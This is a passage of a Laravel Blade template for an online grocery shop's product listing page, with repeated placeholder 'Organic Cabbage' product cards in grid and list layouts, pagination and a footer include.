                                  <div class="product_image_wrap">
                                    <a
                                      class="product_image d-flex justify-content-center align-items-center"
                                      href="#!"
                                      target="_blank"
                                    >
                                      <img
                                        class="pic-1"
                                        src="{{asset('public/assets/images/product/product36.png')}}"
                                        alt="image_not_found"
                                      />
                                      <img
                                        class="pic-2"
                                        src="{{asset('public/assets/images/product/product5.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                    <ul
                                      class="product_badge_group ul_li_block"
                                    >
                                      <li>
                                        <span
                                          class="product_badge badge_meats position-absolute rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="product_badge badge_discount position-absolute rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <ul
                                      class="product_action_btns ul_li_block d-flex"
                                    >
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Search Product"
                                          href="#!"
                                          ><i class="fas fa-search"></i
                                        ></a>
                                      </li>
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Add To Cart"
                                          href="#product_quick_view"
                                          data-bs-toggle="modal"
                                          ><i
                                            class="fas fa-shopping-bag"
                                          ></i
                                        ></a>
                                      </li>
                                    </ul>
                                  </div>
                                  <div class="rating_wrap d-flex">
                                    <ul class="rating_star ul_li">
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li><i class="far fa-star"></i></li>
                                    </ul>
                                    <span class="shop_review_text"
                                      >( 4.0 )</span
                                    >
                                  </div>
                                  <div class="product_content">
                                    <h3 class="product_title">
                                      <a href="#!" target="_blank"
                                        >Organic Cabbage</a
                                      >
                                    </h3>
                                    <div class="product_price">
                                      <span class="sale_price pe-1"
                                        >$50.00</span
                                      >
                                      <del>$65.00</del>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div class="col-sm-6 col-lg-4">
                              <div
                                class="product_layout_1 overflow-hidden position-relative"
                              >
                                <div
                                  class="product_layout_content bg-white position-relative"
                                >
                                  <div class="product_image_wrap">
                                    <a
                                      class="product_image d-flex justify-content-center align-items-center"
                                      href="#!"
                                      target="_blank"
                                    >
                                      <img
                                        class="pic-1"
                                        src="{{asset('public/assets/images/product/product37.png')}}"
                                        alt="image_not_found"
                                      />
                                      <img
                                        class="pic-2"
                                        src="{{asset('public/assets/images/product/product8.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                    <ul
                                      class="product_badge_group ul_li_block"
                                    >
                                      <li>
                                        <span
                                          class="product_badge badge_meats position-absolute rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="product_badge badge_discount position-absolute rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <ul
                                      class="product_action_btns ul_li_block d-flex"
                                    >
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Search Product"
                                          href="#!"
                                          ><i class="fas fa-search"></i
                                        ></a>
                                      </li>
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Add To Cart"
                                          href="#product_quick_view"
                                          data-bs-toggle="modal"
                                          ><i
                                            class="fas fa-shopping-bag"
                                          ></i
                                        ></a>
                                      </li>
                                    </ul>
                                  </div>
                                  <div class="rating_wrap d-flex">
                                    <ul class="rating_star ul_li">
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li><i class="far fa-star"></i></li>
                                    </ul>
                                    <span class="shop_review_text"
                                      >( 4.0 )</span
                                    >
                                  </div>
                                  <div class="product_content">
                                    <h3 class="product_title">
                                      <a href="#!" target="_blank"
                                        >Organic Cabbage</a
                                      >
                                    </h3>
                                    <div class="product_price">
                                      <span class="sale_price pe-1"
                                        >$50.00</span
                                      >
                                      <del>$65.00</del>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div class="col-sm-6 col-lg-4">
                              <div
                                class="product_layout_1 overflow-hidden position-relative"
                              >
                                <div
                                  class="product_layout_content bg-white position-relative"
                                >
                                  <div class="product_image_wrap">
                                    <a
                                      class="product_image d-flex justify-content-center align-items-center"
                                      href="#!"
                                      target="_blank"
                                    >
                                      <img
                                        class="pic-1"
                                        src="{{asset('public/assets/images/product/product38.png')}}"
                                        alt="image_not_found"
                                      />
                                      <img
                                        class="pic-2"
                                        src="{{asset('public/assets/images/product/product10.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                    <ul
                                      class="product_badge_group ul_li_block"
                                    >
                                      <li>
                                        <span
                                          class="product_badge badge_meats position-absolute rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="product_badge badge_discount position-absolute rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <ul
                                      class="product_action_btns ul_li_block d-flex"
                                    >
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Search Product"
                                          href="#!"
                                          ><i class="fas fa-search"></i
                                        ></a>
                                      </li>
                                      <li>
                                        <a
                                          class="tooltips"
                                          data-placement="top"
                                          title="Add To Cart"
                                          href="#product_quick_view"
                                          data-bs-toggle="modal"
                                          ><i
                                            class="fas fa-shopping-bag"
                                          ></i
                                        ></a>
                                      </li>
                                    </ul>
                                  </div>
                                  <div class="rating_wrap d-flex">
                                    <ul class="rating_star ul_li">
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li class="active">
                                        <i class="fas fa-star"></i>
                                      </li>
                                      <li><i class="far fa-star"></i></li>
                                    </ul>
                                    <span class="shop_review_text"
                                      >( 4.0 )</span
                                    >
                                  </div>
                                  <div class="product_content">
                                    <h3 class="product_title">
                                      <a href="#!" target="_blank"
                                        >Organic Cabbage</a
                                      >
                                    </h3>
                                    <div class="product_price">
                                      <span class="sale_price pe-1"
                                        >$50.00</span
                                      >
                                      <del>$65.00</del>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        <!-- list layout start  -->
                        <div
                          class="tab-pane fade show"
                          id="list_layout"
                          role="tabpanel"
                          aria-labelledby="pills-list_layout-tab"
                          data-aos="fade-up"
                          data-aos-duration="2000"
                        >
                          <div class="row g-3">
                            <div class="col p-0">
                              <div class="list_layout_wrap overflow-hidden">
                                <div
                                  class="list_layout_content bg-white d-flex justify-content-between align-items-center"
                                >
                                  <div class="col-lg-5">
                                    <a
                                      class="list_layout_thumb d-flex justify-content-start"
                                      href="#!"
                                    >
                                      <img
                                        src="{{asset('public/assets/images/product/product10.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                  </div>
                                  <div class="col-lg-7">
                                    <ul
                                      class="list_layout_bade list-unstyled d-flex"
                                    >
                                      <li>
                                        <span
                                          class="badge_meats rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="badge_discount text-white rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <div class="rating_wrap d-flex">
                                      <ul class="rating_star ul_li">
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li><i class="far fa-star"></i></li>
                                      </ul>
                                      <span class="shop_review_text"
                                        >( 4.0 )</span
                                      >
                                    </div>
                                    <div class="product_content">
                                      <h3 class="product_title py-2">
                                        <a href="#!" target="_blank"
                                          >Organic Cabbage</a
                                        >
                                      </h3>
                                      <div class="product_price">
                                        <span class="sale_price pe-1"
                                          >$50.00</span
                                        >
                                        <del>$65.00</del>
                                      </div>
                                      <p class="list_layout_desc">
                                        Apparently we had reached a great
                                        height in the atmosphere, for the
                                        sky was a dead black, and the stars
                                        had ceased to twinkle.
                                      </p>
                                      <ul
                                        class="product_action_btns ul_li_block d-flex"
                                      >
                                        <li>
                                          <a
                                            class="tooltips"
                                            data-placement="top"
                                            title="Search Product"
                                            href="#!"
                                            ><i class="fas fa-search"></i
                                          ></a>
                                        </li>
                                        <li>
                                          <a
                                            class="tooltips"
                                            data-placement="top"
                                            title="Add To Cart"
                                            href="#product_quick_view"
                                            data-bs-toggle="modal"
                                            ><i
                                              class="fas fa-shopping-bag"
                                            ></i
                                          ></a>
                                        </li>
                                      </ul>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div class="col p-0">
                              <div class="list_layout_wrap overflow-hidden">
                                <div
                                  class="list_layout_content bg-white d-flex justify-content-between align-items-center"
                                >
                                  <div class="col-lg-5">
                                    <a
                                      class="list_layout_thumb d-flex justify-content-start"
                                      href="#!"
                                    >
                                      <img
                                        src="{{asset('public/assets/images/product/product7.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                  </div>
                                  <div class="col-lg-7">
                                    <ul
                                      class="list_layout_bade list-unstyled d-flex"
                                    >
                                      <li>
                                        <span
                                          class="badge_meats rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="badge_discount text-white rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <div class="rating_wrap d-flex">
                                      <ul class="rating_star ul_li">
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li><i class="far fa-star"></i></li>
                                      </ul>
                                      <span class="shop_review_text"
                                        >( 4.0 )</span
                                      >
                                    </div>
                                    <div class="product_content">
                                      <h3 class="product_title py-2">
                                        <a href="#!" target="_blank"
                                          >Organic Cabbage</a
                                        >
                                      </h3>
                                      <div class="product_price">
                                        <span class="sale_price pe-1"
                                          >$50.00</span
                                        >
                                        <del>$65.00</del>
                                      </div>
                                      <p class="list_layout_desc">
                                        Apparently we had reached a great
                                        height in the atmosphere, for the
                                        sky was a dead black, and the stars
                                        had ceased to twinkle.
                                      </p>
                                      <ul
                                        class="product_action_btns ul_li_block d-flex"
                                      >
                                        <li>
                                          <a
                                            class="tooltips"
                                            data-placement="top"
                                            title="Search Product"
                                            href="#!"
                                            ><i class="fas fa-search"></i
                                          ></a>
                                        </li>
                                        <li>
                                          <a
                                            class="tooltips"
                                            data-placement="top"
                                            title="Add To Cart"
                                            href="#product_quick_view"
                                            data-bs-toggle="modal"
                                            ><i
                                              class="fas fa-shopping-bag"
                                            ></i
                                          ></a>
                                        </li>
                                      </ul>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div class="col p-0">
                              <div class="list_layout_wrap overflow-hidden">
                                <div
                                  class="list_layout_content bg-white d-flex justify-content-between align-items-center"
                                >
                                  <div class="col-lg-5">
                                    <a
                                      class="list_layout_thumb d-flex justify-content-start"
                                      href="#!"
                                    >
                                      <img
                                        src="{{asset('public/assets/images/product/product4.png')}}"
                                        alt="image_not_found"
                                      />
                                    </a>
                                  </div>
                                  <div class="col-lg-7">
                                    <ul
                                      class="list_layout_bade list-unstyled d-flex"
                                    >
                                      <li>
                                        <span
                                          class="badge_meats rounded-pill text-uppercase"
                                          >Meats</span
                                        >
                                      </li>
                                      <li>
                                        <span
                                          class="badge_discount text-white rounded-pill"
                                          >-27%</span
                                        >
                                      </li>
                                    </ul>
                                    <div class="rating_wrap d-flex">
                                      <ul class="rating_star ul_li">
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li class="active">
                                          <i class="fas fa-star"></i>
                                        </li>
                                        <li><i class="far fa-star"></i></li>
                                      </ul>
                                      <span class="shop_review_text"
                                        >( 4.0 )</span
                                      >
                                    </div>
                                    <div class="product_content">
                                      <h3 class="product_title py-2">
                                        <a href="#!" target="_blank"
                                          >Organic Cabbage</a
                                        >
                                      </h3>
                                      <div class="product_price">
                                        <span class="sale_price pe-1"
                                          >$50.00</span
                                        >
                                        <del>$65.00</del>
                                      </div>
                                      <p class="list_layout_desc">
                                        Apparently we had reached a great
                                        height in the atmosphere, for the
                                        sky was a dead black, and the stars
                                        had ceased to twinkle.
                                      </p>
                                      <ul
                                        class="product_action_btns ul_li_block d-flex"
                                      >
                                        <li>
                                          <a
                                            class="tooltips"
                                            data-placement="top"
                                            title="Search Product"
                                            href="#!"
                                            ><i class="fas fa-search"></i
                                          ></a>
                                        </li>
                                        <li>
                                          <a
                                            class="tooltips"
                                            data-placement="top"
                                            title="Add To Cart"
                                            href="#product_quick_view"
                                            data-bs-toggle="modal"
                                            ><i
                                              class="fas fa-shopping-bag"
                                            ></i
                                          ></a>
                                        </li>
                                      </ul>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <ul
                      class="pagination_nav mt-5 list-unstyled d-flex justify-content-center text-uppercase clearfix"
                    >
                      <li><a href="#!">1</a></li>
                      <li><a href="#!">2</a></li>
                      <li><a href="#!">3</a></li>
                      <li class="active">
                        <a href="#!"><i class="fas fa-arrow-right"></i></a>
                      </li>
                    </ul>
                  </div>
                </div>
              </section>
              <!-- shop list section end -->
            </div>
          </div>
        </div>
      </div>
    </section>
    <!-- shop list sidebar end -->
  </main>
  <!-- main body end -->
@include('includes.footer')